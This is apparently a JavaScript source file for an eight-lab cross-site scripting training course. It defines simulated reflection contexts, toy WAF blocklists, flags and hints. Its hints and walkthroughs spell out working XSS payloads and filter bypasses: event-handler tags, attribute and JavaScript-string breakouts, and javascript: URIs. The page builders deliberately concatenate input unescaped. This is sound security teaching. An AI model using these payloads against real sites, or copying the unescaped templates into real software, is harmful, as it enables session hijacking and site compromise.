/* ============================================================
   HackRange labs · XSS Playground (8 labs)
   Simulated reflection contexts. The engine shows the raw HTML
   the server would send, applies WAF rules, and decides whether
   a payload would actually execute in that context.
   ============================================================ */

/* shared executor patterns */
function tagWithHandler(s) {
  return /<[a-z][^>]*\s(on[a-z-]+)\s*=\s*[^>]*>/i.test(s);
}
function scriptTag(s) { return /<script\b/i.test(s); }
function jsUri(s) { return /javascript\s*:\s*(alert|eval|prompt|confirm)\s*\(/i.test(s); }
function jsBreakout(s) {
  return /'\s*[-;+]\s*(alert|eval|prompt|confirm)\s*\(|"\s*[-;+]\s*(alert|eval|prompt|confirm)\s*\(/.test(s);
}
function attrBreakout(s) {
  return /["']\s*>\s*<[a-z][^>]*\s(on[a-z-]+)\s*=/i.test(s) || /["']\s*>\s*<script/i.test(s);
}

HR.defineLab({
  id: 'xss-01', cat: 'xss', diff: 1,
  title: 'Hello, Reflection',
  brief: 'The university club site has a gift search page. Every word you type appears on the results page. A senior member says: "if your input comes back in the HTML, the page is yours to play with. Make it run JavaScript." No filters, no tricks. Just prove to yourself that reflection equals execution.',
  env: {
    type: 'reflect',
    app: 'Gift Search',
    placeholder: 'search for a gift...',
    build: v => '<main>\n  <h2>Search results</h2>\n  <p>You searched for: ' + v + '</p>\n  <p>3 gifts found.</p>\n</main>',
    waf: [],
    exec: v => tagWithHandler(v) || scriptTag(v) || jsUri(v)
  },
  flag: 'HR{execution_confirmed}',
  flagNote: 'The environment reveals the flag when your payload fires.',
  hints: [
    'Your input lands directly inside the HTML body, between two paragraph tags. No encoding, no filtering. This is the most classic XSS context there is.',
    'Anything that makes a browser treat your text as code works here: a script tag, or an element with an event handler attribute.',
    'Try: <script>alert(1)</script> or <img src=x onerror=alert(1)>'
  ],
  walk: 'The page drops your input raw into the HTML body, so any HTML you supply becomes part of the page. Both <span class="mono">&lt;script&gt;alert(1)&lt;/script&gt;</span> and <span class="mono">&lt;img src=x onerror=alert(1)&gt;</span> fire. The second is the habit forming one: <span class="mono">src=x</span> fails to load, and the <span class="mono">onerror</span> handler runs your JavaScript. Event handlers survive where script tags get filtered, so most real payloads are handler based. Remember the sequence you just practiced: find the reflection, read the context, then choose the payload. Context first, payload second. Always.',
  study: 'SecLab · Payload Lab · context matrix, then the XSS filter cards.'
});

HR.defineLab({
  id: 'xss-02', cat: 'xss', diff: 1,
  title: 'No Script Allowed',
  brief: 'Same gift site, one week later. The club admin heard about your demo and installed a filter that blocks the script tag. He emails you: "fixed it, no more XSS". You open the search page, type script, and watch the WAF banner appear. He blocked a WORD. He did not block the vulnerability.',
  env: {
    type: 'reflect',
    app: 'Gift Search v2',
    placeholder: 'search for a gift...',
    build: v => '<main>\n  <h2>Search results</h2>\n  <p>You searched for: ' + v + '</p>\n  <p>3 gifts found.</p>\n</main>',
    waf: [{ re: /<script/i, msg: 'Request blocked: the word "<script" is not allowed in input.' }],
    exec: v => tagWithHandler(v) || jsUri(v)
  },
  flag: 'HR{no_script_no_problem}',
  flagNote: 'The environment reveals the flag when your payload fires.',
  hints: [
    'The filter matches the literal string <script. Blocking one tag does not remove the reflection: your HTML still lands in the body.',
    'You need an element that runs JavaScript WITHOUT a script tag. Think event handler attributes.',
    '<img src=x onerror=alert(1)> or <svg onload=alert(1)> both work.'
  ],
  walk: 'The WAF blocks the string <span class="mono">&lt;script</span> and nothing else, so the reflection is still live. Use an element with a built-in failure: <span class="mono">&lt;img src=x onerror=alert(1)&gt;</span>. The fake image fails to load, firing onerror with your code. <span class="mono">&lt;svg onload=alert(1)&gt;</span> works too because onload fires as soon as the svg exists. This is the most important XSS lesson in one lab: BLOCKLISTS BLOCK WORDS, NOT BEHAVIOR. There are dozens of ways to run JS from HTML, and a filter has to catch every single one.',
  study: 'SecLab · Payload Lab · filter logic section, the blocklist vs allowlist discussion.'
});

HR.defineLab({
  id: 'xss-03', cat: 'xss', diff: 2,
  title: 'The Value Trap',
  brief: 'The club rebuilt the search page with a form that remembers your last query. The value comes back inside an HTML attribute: value="your search". The admin proudly says "it is inside an attribute now, tags cannot survive that". He is wrong, and the reason why he is wrong is the single most tested XSS concept in interviews and bug bounty reports alike.',
  env: {
    type: 'reflect',
    app: 'Gift Search v3',
    placeholder: 'search for a gift...',
    build: v => '<main>\n  <h2>Search again</h2>\n  <form>\n    <input type="text" name="q" value="' + v + '" placeholder="search">\n  </form>\n</main>',
    waf: [],
    exec: v => attrBreakout(v)
  },
  flag: 'HR{out_of_the_attribute}',
  flagNote: 'The environment reveals the flag when your payload fires.',
  hints: [
    'Inject a plain word first and READ the raw response. Your input is inside double quotes inside a tag attribute. A tag written there is just text.',
    'To execute, you must first close the attribute and the tag. Two characters do both jobs.',
    'Break out with "> then follow with a working payload: "><svg onload=alert(1)>'
  ],
  walk: 'Inside <span class="mono">value="..."</span> the browser treats everything as attribute text, so <span class="mono">&lt;script&gt;</span> renders as visible text and nothing runs. Break out first: the double quote closes the attribute, the greater-than closes the input tag, and THEN your payload is real HTML. Working payload: <span class="mono">"&gt;&lt;svg onload=alert(1)&gt;</span>. Notice you never left the attribute context guessing: you READ the reflection, identified the context, and built the breakout. That is the method: context decides payload, never the other way around. Attribute contexts need a breakout, body contexts do not.',
  study: 'SecLab · Payload Lab · context ladder: html body, attribute, js string, comment.'
});

HR.defineLab({
  id: 'xss-04', cat: 'xss', diff: 2,
  title: 'Blacklist Blues',
  brief: 'The club admin is learning. His new filter blocks three things: the script tag, onerror and onload. He tests it, sees his own payloads die, and declares victory. But his blocklist has three entries and the HTML event universe has hundreds of handlers. You only need one he forgot.',
  env: {
    type: 'reflect',
    app: 'Gift Search v4',
    placeholder: 'search for a gift...',
    build: v => '<main>\n  <h2>Search results</h2>\n  <p>You searched for: ' + v + '</p>\n  <p>3 gifts found.</p>\n</main>',
    waf: [
      { re: /<script/i, msg: 'blocked: <script' },
      { re: /onerror/i, msg: 'blocked: onerror handler' },
      { re: /onload/i, msg: 'blocked: onload handler' }
    ],
    exec: v => tagWithHandler(v) || jsUri(v)
  },
  flag: 'HR{words_not_concepts}',
  flagNote: 'The environment reveals the flag when your payload fires.',
  hints: [
    'The filter blocks three exact words. Any OTHER event handler still works. List some: onclick, onmouseover, onfocus, ontoggle, onbegin, onstart...',
    'A handler that fires WITHOUT user interaction is best. onmouseover only needs a cursor passing over the element.',
    '<input onmouseover=alert(1)> or <svg onbegin=alert(1)> or <details open ontoggle=alert(1)> all fire.'
  ],
  walk: 'The WAF blocks <span class="mono">&lt;script</span>, <span class="mono">onerror</span> and <span class="mono">onload</span> literally. Pick any other handler: <span class="mono">&lt;input onmouseover=alert(1)&gt;</span> fires the moment a mouse passes over, <span class="mono">&lt;svg onbegin=alert(1)&gt;</span> fires on its own, <span class="mono">&lt;details open ontoggle=alert(1)&gt;</span> fires because the details element opens itself. The lesson generalizes to every security control you will ever meet: enumerating blocked WORDS is not blocking the CAPABILITY. As long as the reflection survives, the attacker only needs the one handler you forgot. This is why context aware output encoding beats blocklists every time.',
  study: 'SecLab · Payload Lab · the event handler family tree.'
});

HR.defineLab({
  id: 'xss-05', cat: 'xss', diff: 3,
  title: 'String Theory',
  brief: 'The club site got a new search that pre-fills a JavaScript variable so the page can restore your query instantly. The source reads: var search = \'your input\';. A script tag inside a JS string is just text, and the filter blocks closing the script tag anyway. To execute here you do not break out of HTML. You break out of the JavaScript string itself.',
  env: {
    type: 'reflect',
    app: 'Gift Search v5',
    placeholder: 'search for a gift...',
    build: v => '<main>\n  <h2>Search results</h2>\n  <script>\n    var search = \'' + v + '\';\n    document.querySelector("#q").value = search;\n  </script>\n  <p>3 gifts found.</p>\n</main>',
    waf: [{ re: /<\/script/i, msg: 'blocked: closing </script> is not allowed in input.' }],
    exec: v => jsBreakout(v)
  },
  flag: 'HR{string_termination}',
  flagNote: 'The environment reveals the flag when your payload fires.',
  hints: [
    'Look at the raw response. Your input sits between single quotes inside JavaScript. The surrounding code is JavaScript, so you must speak JavaScript.',
    'You need to end the string early, end the statement, then start YOUR code. One quote, one semicolon.',
    '\';alert(1);// closes the string, terminates the assignment, runs alert, and comments out the trailing quote.'
  ],
  walk: 'The generated line is <span class="mono">var search = \'YOURINPUT\';</span>. Inject <span class="mono">\';alert(1);//</span> and the line becomes three statements: <span class="mono">var search = \'\'</span> (empty string), <span class="mono">alert(1)</span> (your code), then <span class="mono">//\'</span> comments out the remains. A slicker variant is <span class="mono">\'-alert(1)-\'</span> which uses arithmetic instead of semicolons. JavaScript string contexts are everywhere: JSONP callbacks, inline configs, template pre-fills. The rules change by quote type and by what surrounds the string, so the discipline is always the same: read the exact context in the response, then write the breakout for THAT context.',
  study: 'SecLab · Payload Lab · js string context deep dive with quote variants.'
});

HR.defineLab({
  id: 'xss-06', cat: 'xss', diff: 3,
  title: 'No Angle Brackets',
  brief: 'New filter, new rule: no angle brackets at all. The admin explains: "no < means no tags, no tags means no XSS, QED". Then he builds a link shortener whose output page contains a link built from your input: <a href="YOUR INPUT">. He put your input inside an attribute that already accepts URLs. He handed you a loaded weapon.',
  env: {
    type: 'reflect',
    app: 'LinkShort',
    placeholder: 'https://example.com/your-link',
    build: v => '<main>\n  <h2>Your shortened link</h2>\n  <p>Share it anywhere:</p>\n  <a href="' + v + '" class="btn">Open my link</a>\n</main>',
    waf: [{ re: /</, msg: 'blocked: the character < is not allowed in input.' }],
    exec: v => jsUri(v)
  },
  flag: 'HR{no_angles_needed}',
  flagNote: 'The environment reveals the flag when your payload fires.',
  hints: [
    'You cannot create any tag. So stop thinking about tags. What does the browser DO with the href attribute when someone clicks the link?',
    'href accepts URLs. One URL scheme executes JavaScript directly, and it contains no angle brackets.',
    'javascript:alert(1) typed as the whole input. Click the link in your mind: the browser runs the scheme.'
  ],
  walk: 'The reflection sits inside <span class="mono">href="..."</span>. No breakout is needed because the attribute itself is an execution surface: the <span class="mono">javascript:</span> URL scheme runs script when the link is used. Payload: <span class="mono">javascript:alert(1)</span>, not a single bracket required. This lab teaches you to hunt for EXECUTION SURFACES, not just reflections. href, src, form action, window.open arguments, and bookmarklets are all places where URLs become code. When brackets are filtered, ask yourself: is my input already inside something that executes?',
  study: 'SecLab · Payload Lab · URL scheme contexts and the javascript: family.'
});

HR.defineLab({
  id: 'xss-07', cat: 'xss', diff: 3,
  title: 'The Long Tail of Events',
  brief: 'The admin found a blocklist online titled "100 XSS payloads blocked". He blocks script, img, svg, iframe tags and the five most famous handlers: onerror, onload, onclick, onmouseover, onfocus. It is a big list. It is still a list. The HTML spec has over 70 event handler attributes and new ones ship with every browser release. Find one he forgot and let the flag remind you why blocklists lose.',
  env: {
    type: 'reflect',
    app: 'Gift Search v6',
    placeholder: 'search for a gift...',
    build: v => '<main>\n  <h2>Search results</h2>\n  <p>You searched for: ' + v + '</p>\n  <p>3 gifts found.</p>\n</main>',
    waf: [
      { re: /<script/i, msg: 'blocked: <script' },
      { re: /<img/i, msg: 'blocked: <img' },
      { re: /<svg/i, msg: 'blocked: <svg' },
      { re: /<iframe/i, msg: 'blocked: <iframe' },
      { re: /onerror|onload|onclick|onmouseover|onfocus/i, msg: 'blocked: that event handler is on the blocklist' }
    ],
    exec: v => tagWithHandler(v) || jsUri(v)
  },
  flag: 'HR{beyond_onerror}',
  flagNote: 'The environment reveals the flag when your payload fires.',
  hints: [
    'Famous tags are blocked but the HTML tag universe is huge. Any element can carry any event handler. details, marquee, video, audio, body, input, select, textarea...',
    'You need a handler that fires without a click AND a tag that is not on the list. Think about elements that do something on their own when they appear.',
    '<details open ontoggle=alert(1)> or <marquee onstart=alert(1)> or <body onpageshow=alert(1)> all fire on their own.'
  ],
  walk: 'The blocklist covers famous tags and famous handlers, so pair an unfamous tag with an unfamous handler. <span class="mono">&lt;details open ontoggle=alert(1)&gt;</span> fires because the details element toggles open by itself. <span class="mono">&lt;marquee onstart=alert(1)&gt;</span> fires when the marquee starts scrolling, no user action needed. <span class="mono">&lt;body onpageshow=alert(1)&gt;</span> fires when the page loads. Every one of these bypasses the "complete" filter. Defense lesson to carry into your reports: recommend context aware ENCODING (escape quotes and brackets per context) or ALLOWLIST sanitization, because blocklists are always a version behind the platform.',
  study: 'SecLab · Payload Lab · event handler taxonomy lists the full family by trigger type.'
});

HR.defineLab({
  id: 'xss-08', cat: 'xss', diff: 4,
  title: 'The Full Gauntlet',
  brief: 'Final boss of the club site. The admin hired a security consultant who wrote the ultimate filter: famous tags blocked, ten handlers blocked, AND the exact string alert(1) blocked. The consultant bills by the hour and promises this configuration cannot be bypassed. Your move costs nothing but creativity. Stack your bypasses: an unknown tag, an unknown handler, and a slightly different function call.',
  env: {
    type: 'reflect',
    app: 'Gift Search PRO',
    placeholder: 'search for a gift...',
    build: v => '<main>\n  <h2>Search results</h2>\n  <p>You searched for: ' + v + '</p>\n  <p>3 gifts found.</p>\n</main>',
    waf: [
      { re: /<script|<img|<svg|<iframe|<input/i, msg: 'blocked: that tag is on the blocklist' },
      { re: /onerror|onload|onclick|onmouseover|onfocus|ontoggle|onkeydown|onmouseenter/i, msg: 'blocked: that event handler is on the blocklist' },
      { re: /alert\s*\(\s*1\s*\)/i, msg: 'blocked: the exact string alert(1) is forbidden' }
    ],
    exec: v => tagWithHandler(v) || jsUri(v)
  },
  flag: 'HR{blocklists_always_lose}',
  flagNote: 'The environment reveals the flag when your payload fires.',
  hints: [
    'Three separate blocks to bypass, and each one is a word match. List what is NOT blocked: tags like details, marquee, video, body. Handlers like onstart, onbegin, onanimationstart, onauxclick. And alert(1) blocked does not mean alert is blocked.',
    'alert(2), alert(0), confirm(1), prompt(1) are all different strings. Even alert`1` with backticks calls the function.',
    '<marquee onstart=alert(2)> stacks all three bypasses: unknown tag, unknown handler, changed argument.'
  ],
  walk: 'Three word filters, three surgical bypasses. Tag: <span class="mono">marquee</span> (or details, video, body). Handler: <span class="mono">onstart</span> (or onbegin, onanimationstart, onauxclick). Call: <span class="mono">alert(2)</span> (or confirm(1), prompt(1), even alert with backticks <span class="mono">alert`1`</span>). Stacked payload: <span class="mono">&lt;marquee onstart=alert(2)&gt;</span>. The flag name says it all: blocklists always lose, because the platform evolves faster than any list. When you write your own bug bounty reports, this lab is your evidence: recommend output encoding per context, not string matching.',
  study: 'SecLab · Payload Lab · adaptation playbook, then revisit the WAF cards.'
});
